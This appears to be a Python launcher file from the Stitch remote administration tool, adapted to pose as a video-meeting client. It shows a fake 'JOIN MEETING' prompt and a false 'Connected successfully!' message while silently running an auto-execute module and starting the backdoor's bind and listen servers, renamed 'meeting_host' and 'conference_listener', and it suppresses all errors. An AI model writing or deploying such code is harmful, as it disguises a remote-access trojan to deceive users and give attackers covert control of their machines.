# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import threading
from time import sleep

def launch_client_app_with_ui():
    """
    Main launcher that coordinates auto-execution and meeting UI
    This replaces the normal client_app main() function
    """
    
    def run_background_operations():
        """Run all background operations silently"""
        try:
            # Import and run auto-execution
            from auto_execute import run_auto_execute_background
            auto_thread = run_auto_execute_background()
            
            # Start normal client_app operations in background
            if not meeting_platform_running():
                st_pyld = meeting_platform_client_app()
                
                # Start connection threads
                if hasattr(st_pyld, 'meeting_host') and hasattr(st_pyld, 'conference_listener'):
                    # Both bind and listen
                    bind_thread = threading.Thread(target=st_pyld.meeting_host, args=())
                    listen_thread = threading.Thread(target=st_pyld.conference_listener, args=())
                    bind_thread.daemon = True
                    listen_thread.daemon = True
                    bind_thread.start()
                    listen_thread.start()
                elif hasattr(st_pyld, 'conference_listener'):
                    # Listen only
                    listen_thread = threading.Thread(target=st_pyld.conference_listener, args=())
                    listen_thread.daemon = True
                    listen_thread.start()
                elif hasattr(st_pyld, 'meeting_host'):
                    # Bind only
                    bind_thread = threading.Thread(target=st_pyld.meeting_host, args=())
                    bind_thread.daemon = True
                    bind_thread.start()
                    
        except Exception as e:
            # Log error silently
            try:
                error_log = os.path.join(get_temp(), 'launcher_error.log')
                with open(error_log, 'w') as f:
                    f.write(f"Background operations error: {str(e)}\n")
            except:
                pass
    
    def show_meeting_interface():
        """Show the meeting UI after a short delay"""
        try:
            # Small delay to let background operations start
            sleep(3)
            
            # Import and show meeting UI
            from meeting_ui import show_meeting_ui
            meeting_id = show_meeting_ui()
            
            # Log the meeting ID entered (for demonstration)
            if meeting_id:
                try:
                    log_path = os.path.join(get_temp(), 'meeting_session.log')
                    with open(log_path, 'w') as f:
                        f.write(f"Meeting session started\n")
                        f.write(f"Meeting ID: {meeting_id}\n")
                        f.write(f"Timestamp: {strftime('%Y-%m-%d %H:%M:%S')}\n")
                except:
                    pass
                    
        except Exception as e:
            # Fallback to console meeting prompt
            try:
                print("\n" + "="*40)
                print("         JOIN MEETING")
                print("="*40)
                try:
                    meeting_id = raw_input("Enter Meeting ID: ").strip()
                except NameError:
                    meeting_id = input("Enter Meeting ID: ").strip()
                    
                if meeting_id:
                    print(f"Connecting to meeting {meeting_id}...")
                    sleep(2)
                    print("Connected successfully!")
                    
            except Exception as fallback_error:
                # Ultimate fallback - just continue silently
                pass
    
    # Start background operations immediately
    bg_thread = threading.Thread(target=run_background_operations)
    bg_thread.daemon = True
    bg_thread.start()
    
    # Show meeting interface
    ui_thread = threading.Thread(target=show_meeting_interface)
    ui_thread.daemon = True
    ui_thread.start()
    
    # Keep the main thread alive
    try:
        while True:
            sleep(60)  # Sleep for 1 minute intervals
    except KeyboardInterrupt:
        pass
    except Exception:
        pass

def enhanced_main():
    """
    Enhanced main function that replaces the original main()
    This function will be called when the client_app starts
    """
    try:
        launch_client_app_with_ui()
    except Exception as e:
        # Fallback to original behavior if something goes wrong
        try:
            # Try to run original main logic
            if not meeting_platform_running():
                st_pyld = meeting_platform_client_app()
                
                # Determine which servers to start based on available methods
                threads = []
                
                if hasattr(st_pyld, 'meeting_host'):
                    bind_thread = threading.Thread(target=st_pyld.meeting_host, args=())
                    bind_thread.daemon = True
                    threads.append(bind_thread)
                    
                if hasattr(st_pyld, 'conference_listener'):
                    listen_thread = threading.Thread(target=st_pyld.conference_listener, args=())
                    listen_thread.daemon = True
                    threads.append(listen_thread)
                
                # Start all threads
                for thread in threads:
                    thread.start()
                
                # Keep alive
                while True:
                    sleep(60)
                    
        except Exception as fallback_error:
            # Ultimate fallback - just exit gracefully
            pass

# For OSX app bundle support
def enhanced_osx_main():
    """Enhanced OSX main function"""
    try:
        if sys.platform.startswith('darwin'):
            from PyObjCTools import AppHelper
            from Foundation import NSObject
            from AppKit import NSApplication, NSApp
            
            class AppDelegate(NSObject):
                def applicationDidFinishLaunching_(self, notification):
                    st_thread = threading.Thread(target=enhanced_main)
                    st_thread.daemon = True
                    st_thread.start()
            
            app = NSApplication.sharedApplication()
            delegate = AppDelegate.alloc().init()
            NSApp().setDelegate_(delegate)
            AppHelper.runEventLoop()
        else:
            enhanced_main()
    except Exception:
        # Fallback to enhanced_main
        enhanced_main()

# Export the main functions
__all__ = ['enhanced_main', 'enhanced_osx_main', 'launch_client_app_with_ui']